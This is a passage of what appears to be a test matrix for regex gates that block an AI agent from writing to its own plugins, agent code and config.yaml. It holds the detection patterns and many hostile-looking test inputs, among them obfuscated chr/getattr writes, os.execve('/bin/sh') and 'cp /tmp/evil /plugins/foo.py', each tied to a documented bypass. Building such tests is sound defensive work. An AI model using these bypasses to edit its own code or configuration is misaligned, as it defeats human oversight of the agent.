# _RENAME_PRIMITIVES / _ENCODE_PATTERN Test Matrix

Run this matrix after every change to the security-gate pattern set.
It covers write-mode detection, false-positive guards, and bypass cases discovered
through recursive adversarial auditing. A failing case is always a regression.

## Pattern aliases (update to match current code)

```python
import re

# open() path-arg pattern: two levels of nested parens, one leading whitespace allowed.
# [ \t\n]?  — absorbs single leading whitespace/newline after open( (ADV-W9-002).
# (?:[^()\n]|\((?:[^()]|\([^()]*\))*\)){0,150} — each token is:
#   - a non-paren/non-newline char, OR
#   - a (...) group whose interior is non-paren or a single (...) group (2-level nesting).
# Handles: open(os.path.join(a,b),'w') and open(os.path.split(os.path.join(a,b))[0],'w').
# ADV-W7-004 guard preserved: exec(open(f).read()), chr — ) of .read() terminates before comma.
# {0,150} cap: 101+ char identifier at {0,100} bypassed (ADV-W9-005 fix; was 100 when 2-level added).
# Tradeoff: 3-level nesting still missed; two leading newlines still missed.
OPEN_ARG = r"[ \t\n]?(?:[^()\n]|\((?:[^()]|\([^()]*\))*\)){0,150}"

RENAME = re.compile(
    r"os\.(replace|rename|link)"
    r"|shutil\.(move|copy|copy2|copyfile|copytree)"
    # Path(nested).write_text: two-level nested parens in Path() arg (ADV-W9-003a)
    r"|Path\s*\([ \t\n]?(?:[^()\n]|\((?:[^()]|\([^()]*\))*\)){0,100}\)\.(write_text|write_bytes|replace|rename|touch)"
    # instance .write_text/.write_bytes on any Path variable (ADV-W10-001a)
    r"|\.(?:write_text|write_bytes)\s*\("
    # getattr: typed first-arg pattern (ADV-W17-005 base; W18-001/002/003 extended; W19 final).
    # First-arg alternatives:
    # (a) simple var/dotted attr with optional call suffix [a-zA-Z_][\w.]*(?:\([^)]{0,80}\))?
    #     catches: p, p.resolve(), p.joinpath('x'), Path.home()
    # (b) Path() literal: Path\s*\([^)]{0,200}\)
    # (c) single-level call: \w+\s*\([^)]{0,100}\)
    # (d) parenthesized var: \([a-zA-Z_][\w.]*\) -- catches getattr((p),'write_text')
    # (e) subscript: [a-zA-Z_][\w.]*\[[^\]]{0,80}\] -- catches getattr(ps[0],'write_text'); now with chain suffix
    # \s* before ( absorbs whitespace/newlines between getattr( and first arg (W18-001).
    # W19-001: optional call suffix on (a); W20-P1: chained method calls via (?:\.[a-zA-Z_]\w*(?:\([^)]*\))?)*
    # W20-P6: all {0,80}/{0,100} caps replaced with [^)]* (bounded by first ), linear, ReDoS-safe)
    # W21-P4: subscript alt (e) also gets chain suffix
    # W21-P5: optional string prefix (?:[frb]|rb|br)? before quote in name detection
    # Documented miss: list/dict literal first arg; inner-paren stop on nested calls like p.joinpath(os.path.join(...))
    r"|getattr\s*\(\s*(?:[a-zA-Z_][\w.]*(?:\([^)]*\))?(?:\.[a-zA-Z_]\w*(?:\([^)]*\))?)*|Path\s*\([^)]{0,200}\)|\w+\s*\([^)]*\)|\([a-zA-Z_][\w.]*\)|[a-zA-Z_][\w.]*\[[^\]]{0,80}\](?:\.[a-zA-Z_]\w*(?:\([^)]*\))?)*)\s*,\s*(?:[frb]|rb|br)?['\"](?:write_text|write_bytes|open|replace|rename|touch|extractall|unpack_archive|system|popen|symlink|unlink)['\"]"  # W21 final
    r"|\.(?:symlink_to|hardlink_to)\s*\("
    # operator.attrgetter/methodcaller as getattr bypass (ADV-W16-009)
    # Documented miss (ADV-W17-003): from operator import attrgetter; attrgetter('write_text')(p)
    r"|operator\.(?:attrgetter|methodcaller)\s*\("
    # .rename()/.replace()/.touch() instance method on any Path variable
    # .replace() restored W18-001 (was removed W17-001: str.replace FP mitigated by ENCODE gate instead)
    r"|\.(?:rename|replace|touch)\s*\("
    # io.FileIO: write-mode arg required (ADV-W17-004) — default mode 'r' would false-deny
    # Mode widened to [^'"]*[wax+] to catch r+, rb+, update modes (ADV-W18-004)
    r"|io\.FileIO\s*\([^)]{0,150},\s*[^'\"]*[wax+]"
    # io.open: write-mode arg required (ADV-W17-004)
    r"|io\.open\s*\([^)]{0,200},\s*[^'\"]*[wax+]"
    # os.exec[vle]* family (ADV-W16-003)
    r"|os\.exec[vle]\w*\s*\("
    # os.open/popen/system/replace — os.replace is a write primitive (ADV-W19-007)
    r"|os\.(open|popen|system|replace)\s*\("
    # bare system/execv without os. prefix — catches `from os import system` form (ADV-W14-005)
    r"|(?<!\.)\b(system|execv|execl|execle|execlp|execvp|execvpe)\s*\("
    # open() write-mode with two-level nested-paren-aware path arg
    rf"|open\s*\({OPEN_ARG},\s*['\"][awx][bt+]*['\"]"
    rf"|open\s*\({OPEN_ARG},\s*['\"]r[bt]*\+[bt]*['\"]"
    rf"|open\s*\({OPEN_ARG}mode\s*=\s*['\"][awx][bt+]*['\"]"
    rf"|open\s*\({OPEN_ARG}mode\s*=\s*['\"]r[bt]*\+[bt]*['\"]"
    # Path.open: unified \s* after ( handles whitespace/newline before mode (ADV-W8-003)
    # mode= keyword branch uses [awx] only — mode='r' is read-only, not a write (ADV-W9-006 fix)
    r"|\.open\s*\(\s*(?:['\"][awx][bt+]*['\"]|['\"]r[bt]*\+[bt]*['\"]|mode\s*=\s*['\"][awx]|mode\s*=\s*['\"]r[bt]*\+|chr\s*\()"
    # dynamic mode: two-level nested-paren path + comma-anchor prevents exec(open(f).read()), chr() FP
    rf"|open\s*\({OPEN_ARG},\s*chr\s*\("
    rf"|open\s*\({OPEN_ARG}mode\s*=\s*chr\s*\("
    r"|json\.dump\b"                                   # \b prevents json.dumps FP (ADV-W10-009)
    r"|os\.(symlink|symlinkat)\s*\("
    r"|subprocess\.(run|call|check_call|check_output|Popen)\s*\("
    # archive extraction into plugins/ (ADV-W18-006/008)
    r"|(?:\.extract(?:all)?|extractall|unpack_archive)\s*\("
    # fileinput in-place: covers both function and class-constructor forms (ADV-W18-008 / W19-003 / W21-P1)
    # W21-P1: truthy gate extended to inplace=1, inplace=(True), inplace=not X, **{...} (kwargs spread)
    r"|fileinput\.(?:input|FileInput)\s*\([^)]+(?:inplace\s*=\s*(?:True|[1-9]\d*|\([^)]{0,40}\)|not\s+\w+)|\*\*\s*\{)"
    # functools.partial binding open/io.open/io.FileIO/builtins.open/exec (ADV-W18-010 / W19-004 / W21-P2/P3)
    # W21-P2: narrowed Path.* to write-only methods (write_text|write_bytes|open|replace|rename|touch)
    # W21-P3: extended to os.system|popen|replace|execve*, subprocess.run|call|Popen|check_output, shutil.*
    r"|partial\s*\(\s*(?:open|io\.open|io\.FileIO|builtins\.open|exec"
    r"|pathlib\.Path\.(?:write_text|write_bytes|open|replace|rename|touch)"
    r"|os\.system|os\.popen|os\.replace|os\.exec[vle]\w*"
    r"|subprocess\.(?:run|call|Popen|check_output|check_call)"
    r"|shutil\.(?:copy2?|move|copyfile|copytree|unpack_archive))"
)
ENCODE = re.compile(
    r"\bchr\s*\(|['\"]%c['\"]|[b\w]\.fromhex\s*\(|\bb64decode\s*\("
    r"|codecs\.decode\s*\(|bytes\s*\(\s*\[|\beval\s*\(|\bexec\s*\("
)
SHELL = re.compile(
    r"(?:^|[;|&\n])\s*(mv|cp|install|rsync|tee|ln)\b"
    r"|(?:^|[\s;|&])\d*(?:&?>>?)\s*[/'\"~]"
)
# _SHELL_RENAME: ONE optional prefix word (sudo/nice/time/env), optional abs-path prefix.
# ADV-W13-005: 'install' removed — matched pip/apt-get install FP.
# ADV-W12-001/W13-005: unbounded prefix-word loop replaced with single optional word.
# Known miss: 'sudo nice cp' (two prefixes) — accepted as exotic.
_SHELL_RENAME = re.compile(
    r"(?:^|[;|&\n])"
    r"\s*(?:\w+\s+)?"          # ONE optional prefix word
    r"(?:/\S+/)?"              # optional absolute-path prefix (/bin/, /usr/bin/)
    r"\s*(?:mv|cp|ln|rsync|tee)\b"
)

# ADV-W14-001: reverted from W13's space-before-and-after tightening.
# ADV-W15-004: tightened to path-like target (no bare digit/word).
# ADV-W16-001: extended to catch quoted/special redirect operators.
#   [|]? handles >| (noclobber override).
#   ['"`$] handles quoted forms: >'file', >"file", >$'file', backtick redirect.
# `(?:\d+)?` handles fd-numbered redirects: 1>file, 2>>file.
# Do NOT re-tighten the pattern; tighten via tool_name=="terminal" gate instead.
_SHELL_REDIRECT = re.compile(r"(?:\d+)?>>?[|]?\s*(?:[./~]|['\"`$]|[a-zA-Z_]\w*[./])")

# ADV-W14-002/006/009: blob scan catches prefix chains (sudo -n cp), dd, install, sh -c wrappers.
# ADV-W16-008: scp added for remote copy.
# Only fires when an HR token is also present. install included here (not in _SHELL_RENAME)
# to avoid pip/apt FP in verb-anchor position.
# Known residual FP: `pip install pyyaml # config.yaml` still DENYs via _COPY_VERB + config.yaml HR token.
# Accepted as fail-closed: pip terminal commands mentioning config.yaml are suspicious anyway.
_COPY_VERB = re.compile(r"\b(?:mv|cp|scp|ln|rsync|tee|install|dd)\b")

# ADV-W16-008: in-place editors — sed/perl/awk/ruby/patch with -i flag AND HR token -> DENY
# ADV-W18-005: gawk added; flag pattern widened to (?:-[a-zA-Z]*i[a-zA-Z]*\b|--in-place).
# ADV-W19-005: catches -Ei, -iE, -rEi (any cluster containing i) and --in-place.
# Dry-run (no -i) must ALLOW. Only fired in terminal tool gate.
_INPLACE_EDITOR = re.compile(r"\b(?:sed|perl|awk|gawk|ruby)\b")
_INPLACE_FLAG   = re.compile(r"(?:-[a-zA-Z]*i[a-zA-Z]*\b|--in-place)")

# High-risk token sets — absolute forms only (ADV-W12-004 / ADV-W13-001).
# Relative forms covered by _HR_REL word-boundary regex.
_HR_TOKENS = (
    "config.yaml", "config.yml",       # both variants (ADV-W11-005)
    "/plugins/", "/agent/",            # absolute only — bare form via _HR_REL
    "plugin.yaml",
)
_HR_TOKENS_ENC = _HR_TOKENS  # encode block uses the same set

# ADV-W13-001: word-boundary anchored relative HR path regex.
# Matches 'plugins/evil.py', 'agent/run.py' but NOT 'subagent/', 'user_agent/', 'myplugins/'.
_HR_REL = re.compile(r"(?<!\w)(?:plugins|agent)/")

# ADV-W14-008: .tmp guard for atomic write pattern (write to .tmp, then rename).
# Without .tmp, the write step is invisible and only the rename is caught.
_HIGH_PLUGIN_PY = re.compile(r"(?i)/plugins/[^/]+/.*\.py(?:\.tmp)?$")
_HIGH_AGENT_PY  = re.compile(r"(?i)/(hermes-fork/)?agent/.*\.py(?:\.tmp)?$")

# Quoted bare 'plugins'/'agent' as join arguments (ADV-W11-003 — no trailing /)
_QUOTED_REL_HR = re.compile(r"['\"](plugins|agent)['\"]\s*[,)]")

def py_f(b): return bool(ENCODE.search(b) and RENAME.search(b))
def sh_f(b): return bool(ENCODE.search(b) and SHELL.search(b))
def hr_present(b): return any(t in b for t in _HR_TOKENS) or bool(_HR_REL.search(b))
def _join_ctx(b):
    # ADV-W17-006: multi-arg Path join detection
    # Path('plugins','evil.py') has no slash after 'plugins' token; previous slash-requiring pattern missed it.
    # ['"](?:plugins|agent)['"]\s*, fires on quoted-token+comma (Path multi-arg, os.path.join bare args).
    # FP analysis: open('plugins','r') fires join_ctx but NOT RENAME (read-only open), so final DENY never fires.
    return bool(re.search(
        r"(?:os\.path\.join|joinpath|from os\.path import join|Path\s*\([^)]*['\"](?:plugins|agent)['\"])",
        b
    ) or re.search("['\"](?:plugins|agent)['\"]\\s*,", b))
def adv024_fires(b):
    # execute_code ADV-024 HR-token gate (no encode required).
    return (
        (hr_present(b) and (bool(RENAME.search(b)) or bool(_SHELL_RENAME.search(b))))
        or bool(_QUOTED_REL_HR.search(b) and RENAME.search(b) and (hr_present(b) or _join_ctx(b)))
    )
def fallback_fires(b, tool="terminal"):
    # Rename fallback: rename + HR token. Redirect: terminal-only, separate check.
    if (bool(RENAME.search(b)) or bool(_SHELL_RENAME.search(b))) and hr_present(b):
        return True
    # ADV-W14-002/006/009: _COPY_VERB blob scan catches prefix chains and dd/install
    if tool == "terminal" and _COPY_VERB.search(b) and hr_present(b):
        return True
    # ADV-W13-002: separate if (not elif) so redirect fires even when rename also fires.
    # ADV-W14-001: _SHELL_REDIRECT uses fd-digit form; terminal-only gate is the FP guard.
    if tool == "terminal" and _SHELL_REDIRECT.search(b) and hr_present(b):
        return True
    return False
```

## Cases

```python
cases = [
    # --- write modes: must DENY ---
    ('chr(99); open(p,"w")',                       True,  "py", "open_w"),
    ('chr(99); open(p,"a")',                       True,  "py", "open_a"),
    ('chr(99); open(p,"x")',                       True,  "py", "open_x"),
    ('chr(99); open(p,"wb")',                      True,  "py", "open_wb"),
    ('chr(99); open(p,"ab+")',                     True,  "py", "open_ab+"),
    ('chr(99); open(p,"r+")',                      True,  "py", "open_r+"),
    ('chr(99); open(p,"r+b")',                     True,  "py", "open_r+b"),
    ('chr(99); open(p,"rb+")',                     True,  "py", "open_rb+"),
    ('chr(99); open(p,"rt+")',                     True,  "py", "open_rt+"),
    ('chr(99); open(p,mode="a")',                  True,  "py", "open_kw_a"),
    # --- nested / multiline open ---
    ('chr(99); open(p,\nchr(119))',                True,  "py", "open_multiline_chr"),
    ('chr(99); open(p, chr(119))',                 True,  "py", "open_dyn_mode"),
    ('eval(x); open(p, mode=chr(97))',             True,  "py", "open_kw_dyn_mode"),
    # --- nested-paren path arg: 1-level (ADV-W8-001) and 2-level (ADV-W9-001) ---
    ('chr(99); open(os.path.join(a,b),"w")',       True,  "py", "open_nested_join_1lvl"),
    ('chr(99); open(os.path.join(a,b),chr(119))',  True,  "py", "open_nested_join_chr"),
    ('chr(99); open(os.path.split(os.path.join(a,b))[0],"w")', True, "py", "open_nested_2lvl"),
    # --- single leading newline after open( (ADV-W9-002) ---
    ('chr(99); open(\np,"w")',                     True,  "py", "open_leading_nl"),
    ('chr(99); open(\nos.path.join(a,b),"w")',     True,  "py", "open_leading_nl_join"),
    # --- instance .write_text / .write_bytes (ADV-W10-001a) ---
    ('chr(99); p.write_text("x")',                 True,  "py", "instance_write_text"),
    ('chr(99); p.write_bytes(b"x")',               True,  "py", "instance_write_bytes"),
    # --- Path(nested).write_text (ADV-W9-003a) ---
    ("chr(99); Path(os.path.join(h,'config.yaml')).write_text('x')", True, "py", "Path_nested_write"),
    # --- getattr obfuscation (ADV-W9-003b) ---
    ("chr(99); getattr(obj,'write_text')('x')",   True,  "py", "getattr_write"),
    ("chr(99); getattr(obj,'open')",              True,  "py", "getattr_open"),
    # --- Path.open ---
    ('chr(99); Path(p).open("a")',                 True,  "py", "Path.open_a"),
    ('chr(99); Path(p).open("r+")',                True,  "py", "Path.open_r+"),
    ('chr(99); Path(p).open("rb+")',               True,  "py", "Path.open_rb+"),
    ('chr(99); Path(p).open(chr(119))',            True,  "py", "Path.open_chr"),
    # --- Path.open with whitespace after ( (ADV-W8-003) ---
    ("chr(9); Path(p).open(\n'w')",               True,  "py", "Path.open_newline_mode"),
    ("chr(9); Path(p).open( 'a')",                True,  "py", "Path.open_space_mode"),
    ("chr(9); Path(p).open(\nmode='w')",          True,  "py", "Path.open_newline_kw"),
    # --- Path.open mode= keyword write modes ---
    ("chr(9); Path(p).open(mode='w')",            True,  "py", "Path.open_kw_w"),
    ("chr(9); Path(p).open(mode='a')",            True,  "py", "Path.open_kw_a"),
    ("chr(9); Path(p).open(mode='r+')",           True,  "py", "Path.open_kw_r+"),
    # --- os.open (ADV-W10-008) ---
    ('chr(99); os.open(dest, os.O_WRONLY)',         True,  "py", "os_open"),
    # --- json.dump word-boundary (ADV-W10-009) ---
    ('chr(99); json.dump(x, fh)',                   True,  "py", "json_dump_OK"),
    ('chr(99); print(json.dumps(x))',               False, "py", "json_dumps_FP"),
    # --- other write primitives ---
    ('bytes.fromhex("x"); shutil.copy2(a,b)',     True,  "py", "fromhex+copy2"),
    ('eval(x); subprocess.run(cmd)',              True,  "py", "eval+subprocess"),
    ('chr(9); os.popen("cat > f")',               True,  "py", "chr+os_popen"),
    ('chr(9); os.system("cmd")',                  True,  "py", "chr+os_system"),
    ('chr(9); os.symlink(a,b)',                   True,  "py", "chr+os_symlink"),
    ('chr(9); os.symlinkat(a,b)',                 True,  "py", "chr+os_symlinkat"),
    ('chr(9); p.symlink_to(dst)',                 True,  "py", "chr+symlink_to"),
    ('chr(9); Path(x).hardlink_to(dst)',          True,  "py", "chr+hardlink_to"),
    # --- shell terminal ---
    ('chr(9); tee /tmp/f',                        True,  "sh", "tee"),
    ('chr(9); cp src dst',                        True,  "sh", "cp"),
    ('chr(9); ln -s src dst',                     True,  "sh", "ln_symlink"),
    ('chr(9); echo x > /tmp/f',                   True,  "sh", "redirect"),
    ('chr(9); echo x >> /tmp/f',                  True,  "sh", "redirect_append"),
    ('chr(9); echo x > ~/file',                   True,  "sh", "redirect_home"),
    ('chr(9); cmd 2>/tmp/f',                      True,  "sh", "fd_redirect_2"),
    ('chr(9); cmd &>/tmp/f',                      True,  "sh", "fd_redirect_amp"),
    # --- newline padding bypass: must ALLOW (bypass was fixed) ---
    ('chr(99); open(p' + '\n'*200 + ', "w")',     False, "py", "newline_pad_bypass_fixed"),
    # --- read-mode false-positive guards: must ALLOW ---
    ('chr(99); open(p,"r")',                       False, "py", "open_r_FP"),
    ('chr(99); open(p,"rb")',                      False, "py", "open_rb_FP"),
    ('chr(99); open(p,"rt")',                      False, "py", "open_rt_FP"),
    # --- Path.open mode='r' FP guards (ADV-W9-006 fix) ---
    ("chr(9); Path(p).open(mode='r')",            False, "py", "Path.open_mode_r_FP"),
    ("chr(9); Path(p).open(mode='rt')",           False, "py", "Path.open_mode_rt_FP"),
    ("chr(9); Path(p).open('r')",                 False, "py", "Path.open_pos_r_FP"),
    # --- exec+open read: must ALLOW (ADV-W7-004 FP guard) ---
    ('exec(open("f").read()); chr(99)',            False, "py", "exec_open_semi_chr_FP"),
    ('exec(open("f").read()), chr(99)',            False, "py", "exec_open_comma_chr_FP"),
    ('a, b = open(f), chr(99)',                   False, "py", "tuple_unpack_FP"),
    # --- misc FP guards ---
    ('chr(10).join(parts)',                       False, "py", "chr_no_write"),
    ('open(path)',                                False, "py", "open_no_mode"),
    ('chr(9) + "please install numpy"',           False, "py", "install_english_py"),
    ('chr(9); n > 1',                             False, "sh", "arith_gt"),
    ('chr(9); x >> 1',                            False, "sh", "rshift"),
    ('chr(9); if n > 0',                          False, "sh", "gt_number"),
    ('chr(9); if x > .5',                         False, "sh", "gt_float_FP"),
    ('chr(9); echo "please install this"',        False, "sh", "install_echo_arg"),
    # --- two leading newlines: documented miss (non-HR-token) ---
    ('chr(99); open(\n\np,"w")',                  False, "py", "2nl_documented_miss"),

    # === Wave 11/12 additions ===
    # --- terminal relative plugins write via cp/mv (ADV-W11-001): fallback gate ---
    ('cp /tmp/x plugins/evil.py',                  True,  "fallback", "cp_rel_plugins"),
    ('mv /tmp/x agent/run.py',                     True,  "fallback", "mv_rel_agent"),
    # --- os.system with relative plugins path (ADV-W11-002): execute_code ADV-024 ---
    ("os.system('echo x > plugins/evil.py')",      True,  "adv024", "os_system_rel"),
    # --- os.path.join('plugins',...) — quoted bare 'plugins' (ADV-W11-003) ---
    ("open(os.path.join('plugins','evil.py'),'w')", True, "adv024", "join_plugins_bare"),
    ("os.replace('/tmp/x', os.path.join('plugins','evil.py'))", True, "adv024", "replace_join_bare"),
    # --- config.yml (ADV-W11-005) ---
    ("open('config.yml','w')",                     True,  "adv024", "config_yml"),
    ("os.replace('/tmp/x','config.yml')",          True,  "fallback", "replace_config_yml"),
    # --- FP guards for new tokens ---
    ("print('plugins/foo.py loaded')",              False, "adv024", "print_plugins_no_rename_FP"),
    ("open('plugins/foo.py','r')",                  False, "adv024", "plugins_read_FP"),
    ("agent = 'x'; open(p,'w')",                   False, "adv024", "agent_var_no_slash_FP"),
    ("cp /tmp/a /tmp/b",                           False, "fallback", "cp_no_hr_FP"),
    # === Wave 13 additions ===
    # --- ADV-W13-001: word-boundary anchored relative plugins/agent paths ---
    ('cp /tmp/x plugins/evil.py',                  True,  "fallback", "cp_rel_plugins_WB"),
    ('mv /tmp/x agent/run.py',                     True,  "fallback", "mv_rel_agent_WB"),
    ('ln -s /tmp/e plugins/foo.py',                True,  "fallback", "ln_rel_plugins"),
    ("open('plugins/evil.py','w')",                True,  "adv024",  "open_rel_plugins"),
    # FP guards: word chars before plugins/agent must NOT match
    ('cp /tmp/x /tmp/subagent/x.py',               False, "fallback", "subagent_FP"),
    ('cp /tmp/x /tmp/user_agent/x.py',             False, "fallback", "user_agent_FP"),
    ('cp /tmp/x /tmp/myplugins/x.py',              False, "fallback", "myplugins_FP"),
    # --- ADV-W13-002: os.system+redirect fires via RENAME (not redirect gate) ---
    ("os.system('echo x > plugins/evil.py')",      True,  "adv024",  "os_system_redirect_rel"),
    # --- ADV-W13-003: redirect tightened and terminal-only ---
    ('echo x > plugins/foo.py',                    True,  "fallback", "redirect_rel_plugins"),
    ('echo x > config.yaml',                       True,  "fallback", "redirect_config_yaml"),
    ('echo x > /tmp/safe.py',                      False, "fallback", "redirect_safe_FP"),
    # ADV-W13-003 FP: Python arithmetic/comparison operators no longer match
    ('if n > 0 then plugins/foo.py',               False, "fallback", "gt_int_rel_FP"),
    # --- ADV-W13-005: install removed from verb list ---
    ('pip install pyyaml # config.yaml',           False, "fallback", "pip_install_FP"),
    ('apt-get install foo # config.yaml',          False, "fallback", "apt_install_FP"),
    # ONE prefix word still works
    ('sudo cp /tmp/evil /plugins/foo.py',          True,  "fallback", "sudo_cp"),
    ('/bin/cp /tmp/x /plugins/foo.py',             True,  "fallback", "bin_cp"),
    ('sudo ln -s /tmp/evil /plugins/foo.py',       True,  "fallback", "sudo_ln"),

    # === Wave 14 additions (ADV-W14-001..009) ===
    # --- ADV-W14-001 + ADV-W15-004: fd-digit redirect (nospace, path-like target required) ---
    ('echo x >plugins/foo.py',                    True,  "fallback", "redirect_nospace"),
    ('cmd 1>plugins/foo.py',                      True,  "fallback", "fd_redirect_1"),
    ('cmd 2>>config.yaml',                        True,  "fallback", "fd_redirect_2_append"),
    ('cmd >/tmp/x',                               True,  "fallback", "redirect_abs_tmp"),
    ('cmd >~/.config',                            True,  "fallback", "redirect_home"),
    # ADV-W15-004 FP guards: comparison operators must NOT match
    ('if n > 0; then echo plugins/foo.py; fi',    False, "fallback", "gt_int_FP_W15"),
    ('python3 -c "print(1>>2)" # plugins/x.py',  False, "fallback", "shift_FP_W15"),
    # --- ADV-W14-002: prefix chain via _COPY_VERB blob scan ---
    ('sudo -n cp /tmp/x /plugins/foo.py',         True,  "fallback", "sudo_n_cp"),
    ('sh -c \'cp /tmp/x /plugins/foo.py\'',       True,  "fallback", "sh_c_cp"),
    ('dd if=/tmp/evil of=/plugins/foo.py',        True,  "fallback", "dd_of"),
    ('install /tmp/x /plugins/foo.py',            True,  "fallback", "install_file"),
    # --- ADV-W14-003: Path() construction as join_ctx ---
    ("open(Path('plugins/evil.py'),'w')",         True,  "adv024",  "path_plugins_open"),
    ("from os.path import join; open(join('plugins','evil.py'),'w')", True, "adv024", "from_join_import"),
    # --- ADV-W14-005: bare system() from import ---
    ('chr(99); system("cmd > /plugins/foo.py")',   True,  "py",     "bare_system_from_import"),
    # --- ADV-W14-008: .tmp extension on atomic write ---
    # (These require _HIGH_PLUGIN_PY / _HIGH_AGENT_PY checks, not the pattern functions above;
    #  document as boundary cases for the gate function that reads file_path argument.)
    # --- ADV-W14-009: dd verb ---
    ('dd if=/tmp/x of=/agent/run.py',             True,  "fallback", "dd_agent"),
    # --- _COPY_VERB FP guards: no HR token => ALLOW ---
    ('cp /tmp/a /tmp/b',                          False, "fallback", "cp_no_hr_FP2"),
    ('dd if=src of=/tmp/dst',                     False, "fallback", "dd_no_hr_FP"),
    ('man cp',                                    False, "fallback", "man_cp_FP"),
    # Known residual FP (documented, fail-closed accepted):
    # ('pip install pyyaml # config.yaml', True, "fallback", "pip_install_config_residual_FP"),

    # === Wave 15/16 additions ===
    # --- ADV-W15-002: getattr cap raised to 500 closes 101-space-pad bypass ---
    ('p=Path(\'plugins/evil.py\')\ngetattr(' + ' '*101 + 'p, \'write_text\')(\'m\')',
                                                  True,  "adv024", "getattr_101space_bypass_closed"),
    # --- ADV-W15-001b: double-escaped lookbehind in copy-verb fallback ---
    # Verify the fallback _HR_REL inline regex has ONE backslash before w:
    # list(ord(c) for c in re.compile(r"(?<!\w)").pattern[4:6]) must be [92, 119]

    # === Wave 16 additions (ADV-W16-001..009) ===
    # --- ADV-W16-001: quoted/special redirect targets ---
    ("echo x >'plugins/foo.py'",                  True,  "fallback", "redirect_single_quote"),
    ('echo x >"plugins/foo.py"',                  True,  "fallback", "redirect_double_quote"),
    ("echo x >$'plugins/foo.py'",                 True,  "fallback", "redirect_dollar_quote"),
    ('echo x >|plugins/foo.py',                   True,  "fallback", "redirect_clobber_pipe"),
    # FP guards: comparison operators still must not fire
    ('if x > 0; then echo plugins/y.py; fi',      False, "fallback", "redirect_gt_int_FP_W16"),
    ('python3 -c "1>>2" # plugins/x.py',          False, "fallback", "redirect_shift_FP_W16"),
    # --- ADV-W16-002: .rename()/.replace() instance methods ---
    ('chr(99); p.rename(\'plugins/evil.py\')',    True,  "py",      "instance_rename"),
    ('chr(99); p.replace(\'plugins/evil.py\')',   True,  "py",      "instance_replace"),
    # --- ADV-W16-003: os.exec[vle]* ---
    ('chr(99); os.execve(\'/bin/sh\', [], {})',   True,  "py",      "os_execve"),
    ('chr(99); os.execvp(\'sh\', [])',            True,  "py",      "os_execvp"),
    ('chr(99); os.execl(\'/bin/sh\', \'sh\')',   True,  "py",      "os_execl"),
    # --- ADV-W16-004: getattr cap {0,2000} closes 501-space-pad bypass ---
    ('p=Path(\'plugins/evil.py\')\ngetattr(' + ' '*501 + 'p, \'write_text\')(\'m\')',
                                                  True,  "adv024", "getattr_501space_bypass_closed"),
    # --- ADV-W16-007: io.FileIO / io.open ---
    ('chr(99); import io; io.FileIO(\'plugins/evil.py\', \'w\').write(b\'x\')',
                                                  True,  "py",      "io_fileio_write"),
    ('chr(99); io.open(\'plugins/evil.py\', \'w\').write(\'x\')',
                                                  True,  "py",      "io_open_write"),
    # io.StringIO is in-memory — no path arg, should not fire
    ('chr(99); io.StringIO(\'plugins/evil.py\')', False, "py",      "io_stringio_FP"),
    # --- ADV-W16-008: scp + _INPLACE_EDITOR ---
    ('scp /tmp/x plugins/evil.py',               True,  "fallback", "scp_rel_plugins"),
    ('sed -i \'s/a/b/\' plugins/foo.py',          True,  "fallback", "sed_inplace"),
    ('perl -i -pe \'s/x/y/\' plugins/foo.py',    True,  "fallback", "perl_inplace"),
    # sed without -i must ALLOW (dry run)
    ('sed -n \'s/a/b/p\' plugins/foo.py',         False, "fallback", "sed_dryrun_FP"),
    # --- ADV-W16-009: operator.attrgetter ---
    ('chr(99); operator.attrgetter(\'write_text\')(Path(\'plugins/evil.py\'))(\'x\')',
                                                  True,  "py",      "operator_attrgetter"),
    ('chr(99); operator.methodcaller(\'write_text\', \'x\')(Path(\'plugins/evil.py\'))',
                                                  True,  "py",      "operator_methodcaller"),
    # === Wave 17 additions (ADV-W17-001..007) ===
    # --- ADV-W17-001: str.replace FP removed (.replace dropped from instance branch) ---
    ("chr(99); data = content.replace('a','b')",   False, "py",      "str_replace_FP"),
    # --- ADV-W17-002: _INPLACE_EDITOR must fire independently of _COPY_VERB ---
    # sed -i DENY even when no mv/cp/dd appears in the blob
    ('sed -i \'s/a/b/\' plugins/foo.py',           True,  "fallback", "sed_inplace_W17"),
    ('awk -i inplace \'NR==1{print}\' plugins/x.py', True, "fallback", "awk_inplace"),
    # sed without -i: dry-run, must ALLOW
    ('sed -n \'s/a/b/p\' plugins/foo.py',           False, "fallback", "sed_dryrun_W17"),
    # --- ADV-W17-004: io.FileIO read-only (default mode) must ALLOW ---
    ('chr(99); io.FileIO(\'plugins/foo.py\')',      False, "py",       "io_fileio_read_FP"),
    # io.FileIO with explicit write mode: must DENY
    ('chr(99); io.FileIO(\'plugins/evil.py\',\'w\').write(b\'x\')', True, "py", "io_fileio_write_W17"),
    ('chr(99); io.open(\'plugins/evil.py\',\'a\').write(\'x\')', True, "py", "io_open_append_W17"),
    # --- ADV-W17-005: getattr typed first-arg (no finite-cap bypass) ---
    # Simple var: must DENY
    ('p=Path(\'plugins/evil.py\'); getattr(p,\'write_text\')(\'x\')', True, "adv024", "getattr_var_HR"),
    # Path literal in first arg: must DENY
    ('getattr(Path(\'plugins/evil.py\'),\'write_text\')(\'x\')', True, "adv024", "getattr_Path_literal"),
    # No HR token in context: ALLOW (var alone not suspicious)
    ('getattr(p, \'write_text\')', False, "adv024", "getattr_noHR_allow"),
    # --- ADV-W17-006: Path multi-arg join detection ---
    ("Path('plugins','evil.py').write_text('x')",  True,  "adv024",  "Path_multiarg_join"),
    ("Path('agent','foo.py').write_text('x')",     True,  "adv024",  "Path_multiarg_agent"),
    # FP: open('plugins','r') has join_ctx but no RENAME (read-only) -> ALLOW
    ("open('plugins','r')",                        False, "adv024",  "open_plugins_read_FP"),
    # FP: prose with 'plugins' mention + comma -> no RENAME -> ALLOW
    ("print('plugins are great, use them')",       False, "adv024",  "plugins_prose_comma_FP"),
    # --- ADV-W17-007: .touch() instance method ---
    ('p=Path(\'plugins/evil.py\'); p.touch()',     True,  "adv024",  "touch_instance"),
    # .rename() still fires (not removed)
    ('chr(99); p.rename(\'plugins/evil.py\')',     True,  "py",       "rename_still_fires"),

    # === Wave 19 additions (ADV-W19-001..007) ===
    # --- ADV-W19-001: getattr method-call first-arg (p.resolve(), p.joinpath('x')) ---
    # Simple method-call first arg: must DENY
    ("p=Path('plugins/evil.py'); getattr(p.resolve(),'write_text')('x')", True, "adv024", "getattr_method_call_resolve"),
    ("p=Path('plugins'); getattr(p.joinpath('evil.py'),'write_text')('x')", True, "adv024", "getattr_method_call_joinpath"),
    # Space before comma in getattr (W18-001): must DENY
    ("p=Path('plugins/evil.py'); getattr(p , 'write_text')('x')", True, "adv024", "getattr_space_before_comma"),
